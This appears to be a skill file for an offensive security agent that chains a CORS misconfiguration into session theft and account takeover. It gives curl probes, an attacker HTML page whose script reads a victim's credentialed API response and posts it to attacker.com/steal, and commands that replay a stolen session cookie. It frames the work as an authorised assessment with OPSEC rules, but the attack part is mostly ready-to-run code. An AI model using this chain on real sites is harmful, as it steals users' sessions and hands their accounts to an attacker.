---
name: cors-session-ato
description: Chain CORS misconfiguration → session theft → account takeover
version: 1.0.0
phase: chains
category: chaining
tags: [cors, session, ato, cookie-theft, account-takeover]
tools: [curl, browser-devtools]
difficulty: intermediate
opsec_level: high
time_estimate: 5m
severity_if_found: high
related_skills:
  - hunt-cors-misconfiguration
  - hunt-cors-exploit
  - token-theft
mitre_attack:
  - T1189
  - T1539
  - T1550.004
---

## When to Use

Use this skill when a CORS misconfiguration allows reading cross-origin
responses with credentials. Chain CORS → session token theft → account
takeover without user interaction beyond visiting attacker page.

## Prerequisites

- curl
- CORS misconfiguration confirmed (reflects Origin, allows credentials)
- Active user sessions on target application

## Procedure

```bash
# STEP 1: Confirm CORS reflects Origin with credentials
curl -sk -D- -H "Origin: https://attacker.com" \
  -H "Cookie: session=abc123" \
  "https://TARGET/api/user" 2>/dev/null | grep -i "access-control"

# Expected: Access-Control-Allow-Origin: https://attacker.com
#           Access-Control-Allow-Credentials: true

# STEP 2: Identify endpoints that return sensitive data
curl -sk -b "session=abc123" "https://TARGET/api/user" 2>/dev/null | head -20
curl -sk -b "session=abc123" "https://TARGET/api/profile" 2>/dev/null | head -20
curl -sk -b "session=abc123" "https://TARGET/api/settings" 2>/dev/null | head -20

# STEP 3: Create attacker page to steal session
cat > /tmp/cors-ato.html << 'EOF'
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://TARGET/api/user", true);
xhr.withCredentials = true;
xhr.onreadystatechange = function() {
  if (xhr.readyState == 4 && xhr.status == 200)
    fetch("https://attacker.com/steal", {method:"POST", body:xhr.responseText});
};
xhr.send();
</script>
EOF

# STEP 4: Host attacker page: python3 -m http.server 8888

# STEP 5: Hijack session with stolen cookie
curl -sk -b "session=STOLEN_SESSION_TOKEN" "https://TARGET/api/user" | jq .

# STEP 6: Verify account takeover
curl -sk -b "session=STOLEN_SESSION_TOKEN" "https://TARGET/api/profile" | jq .
```

## OPSEC Rules

- **HIGH RISK**: Session theft enables full account takeover
- Do not perform irreversible actions (password change, deletion)
- Document all session theft for remediation report
- Clean up attacker hosting infrastructure after assessment
- Do not exfiltrate session tokens to external services
- Log all actions performed with stolen session

## Verification

- Confirm CORS reflects Origin with credentials flag
- Verify stolen session provides authenticated access
- Test account actions with hijacked session
- Confirm session is not bound to IP or fingerprint

## Pitfalls

- SameSite cookie attribute may block cross-origin sending
- Session may be bound to IP or User-Agent
- CSRF tokens may block state-changing requests
- Some applications validate Origin server-side

## Output Format

```
[CHAIN] CORS → Session Theft → ATO chain successful
  Step 1: CORS misconfiguration confirmed (Origin reflected, credentials: true)
  Step 2: Vulnerable endpoint: /api/user (returns session data)
  Step 3: Session token stolen via cross-origin XHR
  Step 4: Session hijack successful (full access)
  Step 5: Account actions possible (email change, profile edit)
  Severity: HIGH (8.5)
```
